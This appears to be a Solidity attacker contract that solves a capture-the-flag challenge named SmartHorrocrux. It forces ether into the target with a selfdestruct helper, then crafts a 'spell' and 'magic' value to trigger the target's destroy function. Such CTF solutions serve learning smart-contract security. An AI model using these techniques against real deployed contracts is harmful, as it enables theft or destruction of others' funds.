// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import "../Challenges/SmartHorrocrux.sol";

contract SmartHorrocruxAttacker {
    SmartHorrocrux public smartHorrocrux;

    constructor(address _smartHorrocruxAddress) {
        smartHorrocrux = SmartHorrocrux(_smartHorrocruxAddress);
    }

    // before using this function there is need to use fallback function
    function attack() public payable {
        Selfdestructor selfdestructor = new Selfdestructor{value: 1}(
            address(smartHorrocrux)
        );
        selfdestructor.destroy();
        smartHorrocrux.setInvincible();

        string memory spell = string(
            abi.encodePacked(
                bytes32(
                    0x45746865724b6164616272610000000000000000000000000000000000000000
                )
            )
        );

        bytes32 spellInBytes;
        assembly {
            spellInBytes := mload(add(spell, 32))
        }

        bytes32 selector = bytes32(abi.encodeWithSignature("kill()"));

        uint256 magic = uint256(spellInBytes) - uint256(selector);

        smartHorrocrux.destroyIt(spell, magic);
    }
}

contract Selfdestructor {
    address immutable target;

    constructor(address _target) payable {
        target = _target;
    }

    function destroy() public {
        selfdestruct(payable(target));
    }
}
